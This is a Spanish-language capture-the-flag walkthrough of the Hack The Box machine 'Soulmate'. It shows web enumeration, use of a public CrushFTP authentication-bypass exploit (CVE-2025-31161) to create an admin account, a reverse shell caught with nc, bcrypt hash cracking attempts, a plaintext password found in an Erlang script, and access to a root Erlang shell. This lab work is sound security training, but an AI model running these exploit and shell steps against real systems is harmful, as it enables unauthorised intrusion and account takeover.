# HTB: Soulmate

## Host: Linux
## IP: 10.10.11.86

## Procedimiento y comandos
#### Paso 1: Enumeracion

* Nmap

```bash
nmap -A -v -p- -T4 -Pn -oX soulmate_tcp.scan --webxml 10.10.11.86
```

* Feroxbuster

```bash
feroxbuster -u http://soulmate.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,js,txt,log --dont-filter --status-codes 200,204,301,302,307,403,401 --threads 50
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://soulmate.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 403, 401]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, js, txt, log]
 🏁  HTTP methods          │ [GET]
 🤪  Filter Wildcards      │ false
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c http://soulmate.htb/logout.php => login.php
200      GET      178l      488w     8554c http://soulmate.htb/login.php
200      GET      473l      932w     8657c http://soulmate.htb/assets/css/style.css
200      GET      238l      611w    11107c http://soulmate.htb/register.php
200      GET      306l     1061w    16688c http://soulmate.htb/
403      GET        7l       10w      162c http://soulmate.htb/assets/css/
403      GET        7l       10w      162c http://soulmate.htb/assets/
301      GET        7l       12w      178c http://soulmate.htb/assets/images => http://soulmate.htb/assets/images/
301      GET        7l       12w      178c http://soulmate.htb/assets/css => http://soulmate.htb/assets/css/
301      GET        7l       12w      178c http://soulmate.htb/assets/images/profiles => http://soulmate.htb/assets/images/profiles/
301      GET        7l       12w      178c http://soulmate.htb/assets => http://soulmate.htb/assets/
302      GET        0l        0w        0c http://soulmate.htb/profile.php => http://soulmate.htb/login
200      GET      306l     1061w    16688c http://soulmate.htb/index.php
302      GET        0l        0w        0c http://soulmate.htb/dashboard.php => http://soulmate.htb/login
[####################] - 11m   930489/930489  0s      found:14      errors:0      
[####################] - 11m   186088/186088  279/s   http://soulmate.htb/ 
[####################] - 11m   186088/186088  280/s   http://soulmate.htb/assets/ 
[####################] - 11m   186088/186088  280/s   http://soulmate.htb/assets/css/ 
[####################] - 11m   186088/186088  280/s   http://soulmate.htb/assets/images/ 
[####################] - 11m   186088/186088  280/s   http://soulmate.htb/assets/images/profiles/ 
```

* Dirbuster

```bash
dirsearch -u http://soulmate.htb/                                                             
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/Soulmate/reports/http_soulmate.htb/reports/http_soulmate.htb/__25-09-16_17-57-22.txt

Target: http://soulmate.htb/

[17:57:22] Starting:                                                                                                                                                                                                                        
[17:58:00] 403 -  564B  - /assets/                                          
[17:58:00] 301 -  178B  - /assets  ->  http://soulmate.htb/assets/
[17:58:12] 302 -    0B  - /dashboard.php  ->  /login                        
[17:58:38] 200 -    8KB - /login.php                                        
[17:58:39] 302 -    0B  - /logout.php  ->  login.php                        
[17:59:00] 302 -    0B  - /profile.php  ->  /login                          
[17:59:02] 200 -   11KB - /register.php                                     
                                                                             
Task Completed 
```

* FUFF

```bash
ffuf -u 'http://soulmate.htb/' -H 'Host: FUZZ.soulmate.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soulmate.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 735ms]
:: Progress: [4989/4989] :: Job [1/1] :: 195 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
```

* Searchsploit

Vemos en el title **CrushFTP** buscamos con searchsploit:

```bash
searchsploit "crush ftp"                                  
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Crush FTP 5 - 'APPE' Remote JVM Blue Screen of Death (PoC)                                                                                                                                                | windows/dos/17795.py
CrushFTP 11.3.1 - Authentication Bypass                                                                                                                                                                   | multiple/remote/52295.py
CrushFTP 7.2.0 - Multiple Vulnerabilities                                                                                                                                                                 | multiple/webapps/36126.txt
CrushFTP < 11.1.0 - Directory Traversal                                                                                                                                                                   | multiple/remote/52012.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

* Hacemos mirror del exploit que necesitamos.. en este caso el de la ultima version:

```bash
searchsploit -m 52295   
  Exploit: CrushFTP 11.3.1 - Authentication Bypass
      URL: https://www.exploit-db.com/exploits/52295
     Path: /usr/share/exploitdb/exploits/multiple/remote/52295.py
    Codes: CVE-2025-31161
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/kali/HTB/Soulmate/52295.py
```

#### Paso 2: Acceso inicial

> Despues de intentar sin exito con el exploit de exploit-db, buscamos y encontramos este [exploit](https://github.com/Immersive-Labs-Sec/CVE-2025-31161)

* Clonamos y explotamos

```bash
python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user duckman --password cuack!
[+] Preparing Payloads
  [-] Warming up the target
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: duckman
   [*] Password: cuack!.
```

1. Nos logueamos en el panel con nuestras credenciales.

2. Cambiamos las credenciales de ben, guardamos los cambios y nos deslogueamos

3. Nos logueamos con las nuevas credenciales de ben

4. Subimos un reverse shell en webprod y navegamos a http://soulmate.htb/shel.php con un receptor nc activo:

* Receptor

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.218] from (UNKNOWN) [10.10.11.86] 55954
Linux soulmate 5.15.0-153-generic #163-Ubuntu SMP Thu Aug 7 16:37:18 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 22:55:09 up  3:15,  1 user,  load average: 0.11, 0.08, 0.38
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ben      pts/0    10.10.14.205     22:40    1:25   0.17s  0.17s /bin/bash -l
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

#### Privilege Escalation

* Enumeracion basica:

```bash
www-data@soulmate:/$ find / -type f -name '*.db' 2>/dev/null    
find / -type f -name '*.db' 2>/dev/null
/var/lib/PackageKit/transactions.db
/var/lib/fwupd/pending.db
/var/lib/command-not-found/commands.db
/var/www/soulmate.htb/data/soulmate.db
/usr/lib/firmware/regulatory.db
/usr/lib/x86_64-linux-gnu/avahi/service-types.db
/usr/share/doc/xtrans-dev/xtrans.html.db
```

* Descargamos: /var/www/soulmate.htb/data/soulmate.db

* Inspeccionamos:

```bash
sqlite3 soulmate.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> SELECT * FROM users;
1|admin|$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2|1|Administrator|||||2025-08-10 13:00:08|2025-08
3|test1|$2y$10$EURueWdjwq8njsG9dKg2Eup9I/rcySNZdQ6UJ1JhWAoGu8NH0AB2C|0|test1||||test1_1758062570.jpeg|2025-09-16 22:
sqlite> 
```

* Intentamos crackear:

1. Identificamos el hash con [hash identifier online](https://hashes.com/en/tools/hash_identifier)

2. Buscamos el modo de hashcat
```bash
hashcat -h | grep -i "bcrypt"
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
```
3. Intentamos Crackear:

```bash
hashcat -m 3200 hash_admin.txt  /usr/share/wordlists/rockyou.txt
```
> Luego de un rato concluimos que el hash no es crackeable y debemos buscar otro vector de escalada

Vemos al ejecutar `ps aux | grep root ` que el usuario root ejecuto un script de inicio de sesion en local host parece 127.0.0.1

```bash
root        1097  0.1  1.6 2252808 66964 ?       Ssl  23:08   0:01 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
```

Intentamos revisar el script:

```bash
www-data@soulmate:~/soulmate.htb$ cat /usr/local/lib/erlang_login/start.escript
<.htb$ cat /usr/local/lib/erlang_login/start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```

Vemos un password.. podemos intentar loguearnos con ssh o ejecutar su ben dentro de la sesion nc:

#### User flag

```bash
ssh ben@10.10.11.86                              
ben@10.10.11.86's password: 
Last login: Tue Sep 16 23:43:15 2025 from 10.10.14.218
ben@soulmate:~$ ls -la
total 28
drwxr-x--- 3 ben  ben  4096 Sep  2 10:27 .
drwxr-xr-x 3 root root 4096 Sep  2 10:27 ..
lrwxrwxrwx 1 root root    9 Aug 27 09:28 .bash_history -> /dev/null
-rw-r--r-- 1 ben  ben   220 Aug  6 10:17 .bash_logout
-rw-r--r-- 1 ben  ben  3771 Aug  6 10:17 .bashrc
drwx------ 2 ben  ben  4096 Sep  2 10:27 .cache
-rw-r--r-- 1 ben  ben   807 Aug  6 10:17 .profile
-rw-r----- 1 root ben    33 Sep 16 23:08 user.txt
ben@soulmate:~$ cat user.txt
35e4f71871d5605b97de28190ec49270
ben@soulmate:~$ 
```

#### root flag

* Enumeramos puertos y conexiones

```bash
ben@soulmate:~$ netstat -tulnp 
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:4369            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:35923         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:42783         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::4369                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           - 
```

* El puerto 2222 tiene ssh en ejcucion:

```bash
ben@soulmate:~$ nc 127.0.0.1 2222 
SSH-2.0-Erlang/5.2.9
^C
```

* intentamos conectarnos con las credenciales de ben:

```bash
ben@soulmate:~$ ssh -p 2222 ben@127.0.0.1
ben@127.0.0.1's password: 
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1> help().

** shell internal commands **
b()        -- display all variable bindings
e(N)       -- repeat the expression in query <N>
f()        -- forget all variable bindings
f(X)       -- forget the binding of variable X
h()        -- history
h(Mod)     -- help about module
h(Mod,Func)-- help about function in module
h(Mod,Func,Arity) -- help about function with arity in module
ht(Mod)    -- help about a module's types
ht(Mod,Type) -- help about type in module
ht(Mod,Type,Arity) -- help about type with arity in module
hcb(Mod)    -- help about a module's callbacks
hcb(Mod,CB) -- help about callback in module
hcb(Mod,CB,Arity) -- help about callback with arity in module
history(N) -- set how many previous commands to keep
results(N) -- set how many previous command results to keep
catch_exception(B) -- how exceptions are handled
v(N)       -- use the value of query <N>
rd(R,D)    -- define a record
rf()       -- remove all record information
rf(R)      -- remove record information about R
rl()       -- display all record information
rl(R)      -- display record information about R
rp(Term)   -- display Term using the shell's record information
rr(File)   -- read record information from File (wildcards allowed)
rr(F,R)    -- read selected record information from file(s)
rr(F,R,O)  -- read selected record information with options
lf()       -- list locally defined functions
lt()       -- list locally defined types
lr()       -- list locally defined records
ff()       -- forget all locally defined functions
ff({F,A})  -- forget locally defined function named as atom F and arity A
tf()       -- forget all locally defined types
tf(T)      -- forget locally defined type named as atom T
fl()       -- forget all locally defined functions, types and records
save_module(FilePath) -- save all locally defined functions, types and records to a file
bt(Pid)    -- stack backtrace for a process
c(Mod)     -- compile and load module or file <Mod>
cd(Dir)    -- change working directory
flush()    -- flush any messages sent to the shell
help()     -- help info
h(M)       -- module documentation
h(M,F)     -- module function documentation
h(M,F,A)   -- module function arity documentation
i()        -- information about the system
ni()       -- information about the networked system
i(X,Y,Z)   -- information about pid <X,Y,Z>
l(Module)  -- load or reload module
lm()       -- load all modified modules
lc([File]) -- compile a list of Erlang modules
ls()       -- list files in the current directory
ls(Dir)    -- list files in directory <Dir>
m()        -- which modules are loaded
m(Mod)     -- information about module <Mod>
mm()       -- list all modified modules
memory()   -- memory allocation information
memory(T)  -- memory allocation information of type <T>
nc(File)   -- compile and load code in <File> on all nodes
nl(Module) -- load module on all nodes
pid(X,Y,Z) -- convert X,Y,Z to a Pid
pwd()      -- print working directory
q()        -- quit - shorthand for init:stop()
regs()     -- information about registered processes
nregs()    -- information about all registered processes
uptime()   -- print node uptime
xm(M)      -- cross reference check a module
y(File)    -- generate a Yecc parser
** commands in module i (interpreter interface) **
ih()       -- print help for the i module
true
# Ejecutamos m(). para ver modulos cargados
(ssh_runner@soulmate)2> m().
Module                File
application           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application.beam
application_controll  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_controller.beam
application_master    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/application_master.beam
atomics               preloaded
auth                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/auth.beam
base64                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/base64.beam
beam_a                /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_a.beam
beam_asm              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_asm.beam
beam_block            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_block.beam
beam_call_types       /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_call_types.beam
beam_clean            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_clean.beam
beam_core_to_ssa      /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_core_to_ssa.beam
beam_dict             /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_dict.beam
beam_digraph          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_digraph.beam
beam_doc              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_doc.beam
beam_flatten          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_flatten.beam
beam_jump             /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_jump.beam
beam_lib              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/beam_lib.beam
beam_opcodes          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_opcodes.beam
beam_ssa              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa.beam
beam_ssa_alias        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_alias.beam
beam_ssa_bc_size      /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_bc_size.beam
beam_ssa_bool         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_bool.beam
beam_ssa_bsm          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_bsm.beam
beam_ssa_codegen      /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_codegen.beam
beam_ssa_dead         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_dead.beam
beam_ssa_destructive  /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_destructive_update.beam
beam_ssa_opt          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_opt.beam
beam_ssa_pre_codegen  /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_pre_codegen.beam
beam_ssa_recv         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_recv.beam
beam_ssa_share        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_share.beam
beam_ssa_ss           /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_ss.beam
beam_ssa_throw        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_throw.beam
beam_ssa_type         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_ssa_type.beam
beam_trim             /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_trim.beam
beam_types            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_types.beam
beam_utils            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_utils.beam
beam_validator        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_validator.beam
beam_z                /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/beam_z.beam
binary                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/binary.beam
c                     /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/c.beam
cerl                  /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/cerl.beam
cerl_clauses          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/cerl_clauses.beam
cerl_trees            /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/cerl_trees.beam
code                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/code.beam
code_server           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/code_server.beam
compile               /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/compile.beam
core_lib              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/core_lib.beam
counters              preloaded
crypto                /usr/local/lib/erlang/lib/crypto-5.5.3/ebin/crypto.beam
digraph               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/digraph.beam
digraph_utils         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/digraph_utils.beam
edlin                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/edlin.beam
edlin_key             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/edlin_key.beam
epp                   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/epp.beam
erl_abstract_code     /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_abstract_code.beam
erl_anno              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_anno.beam
erl_bifs              /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/erl_bifs.beam
erl_distribution      /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erl_distribution.beam
erl_epmd              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erl_epmd.beam
erl_eval              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_eval.beam
erl_expand_records    /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_expand_records.beam
erl_features          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_features.beam
erl_init              preloaded
erl_internal          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_internal.beam
erl_lint              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_lint.beam
erl_parse             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_parse.beam
erl_prim_loader       preloaded
erl_scan              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/erl_scan.beam
erl_signal_handler    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erl_signal_handler.beam
erl_tracer            preloaded
erlang                preloaded
erpc                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/erpc.beam
error_handler         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/error_handler.beam
error_logger          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/error_logger.beam
erts_code_purger      preloaded
erts_dirty_process_s  preloaded
erts_internal         preloaded
erts_literal_area_co  preloaded
erts_trace_cleaner    preloaded
escript               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/escript.beam
ets                   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/ets.beam
file                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/file.beam
file_io_server        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/file_io_server.beam
file_server           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/file_server.beam
filename              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/filename.beam
gb_sets               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gb_sets.beam
gb_trees              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gb_trees.beam
gen                   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen.beam
gen_event             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen_event.beam
gen_server            /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen_server.beam
gen_statem            /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/gen_statem.beam
gen_tcp               /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/gen_tcp.beam
global                /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/global.beam
global_group          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/global_group.beam
group                 /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/group.beam
group_history         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/group_history.beam
heart                 /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/heart.beam
inet                  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet.beam
inet_config           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_config.beam
inet_db               /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_db.beam
inet_gethost_native   /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_gethost_native.beam
inet_parse            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_parse.beam
inet_tcp              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_tcp.beam
inet_tcp_dist         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_tcp_dist.beam
inet_udp              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/inet_udp.beam
init                  preloaded
io                    /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io.beam
io_lib                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io_lib.beam
io_lib_format         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io_lib_format.beam
io_lib_pretty         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/io_lib_pretty.beam
kernel                /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/kernel.beam
kernel_config         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/kernel_config.beam
kernel_refc           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/kernel_refc.beam
lists                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/lists.beam
logger                /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger.beam
logger_backend        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_backend.beam
logger_config         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_config.beam
logger_filters        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_filters.beam
logger_formatter      /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_formatter.beam
logger_h_common       /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_h_common.beam
logger_handler_watch  /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_handler_watcher.beam
logger_olp            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_olp.beam
logger_proxy          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_proxy.beam
logger_server         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_server.beam
logger_simple_h       /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_simple_h.beam
logger_std_h          /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_std_h.beam
logger_sup            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/logger_sup.beam
maps                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/maps.beam
net_kernel            /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/net_kernel.beam
orddict               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/orddict.beam
ordsets               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/ordsets.beam
# modulo interesante para ejecutar comandos
os                    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam 
otp_internal          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/otp_internal.beam
peer                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/peer.beam
persistent_term       preloaded
prim_buffer           preloaded
prim_eval             preloaded
prim_file             preloaded
prim_inet             preloaded
prim_net              preloaded
prim_socket           preloaded
prim_tty              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/prim_tty.beam
prim_zip              preloaded
proc_lib              /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/proc_lib.beam
proplists             /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/proplists.beam
pubkey_cert_records   /usr/local/lib/erlang/lib/public_key-1.17.1/ebin/pubkey_cert_records.beam
public_key            /usr/local/lib/erlang/lib/public_key-1.17.1/ebin/public_key.beam
queue                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/queue.beam
rand                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/rand.beam
raw_file_io           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/raw_file_io.beam
raw_file_io_list      /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/raw_file_io_list.beam
re                    /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/re.beam
rpc                   /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/rpc.beam
sets                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/sets.beam
shell                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/shell.beam
shell_default         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/shell_default.beam
socket_registry       preloaded
sofs                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/sofs.beam
ssh                   /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh.beam
ssh_acceptor          /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_acceptor.beam
ssh_acceptor_sup      /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_acceptor_sup.beam
